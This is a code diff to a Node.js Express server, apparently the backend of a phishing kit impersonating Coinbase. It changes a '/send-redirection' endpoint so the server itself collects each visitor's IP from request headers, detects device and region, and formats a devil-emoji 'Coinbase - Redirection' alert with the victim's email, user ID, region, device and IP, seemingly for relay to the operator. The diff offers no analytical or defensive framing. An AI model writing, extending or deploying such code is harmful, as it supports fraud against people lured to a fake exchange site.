@@ -559,11 +559,29 @@ app.post("/resend-sms", async (req, res) => {
 
 app.post("/send-redirection", async (req, res) => {
   try {
-    const { email, userId, region, device, ip, message } = req.body;
+    const { email, userId } = req.body;
 
     if (!email) {
       return res.status(400).json({ error: "Missing email" });
     }
+
+    // Detect region and device from request
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
 
     console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);
 
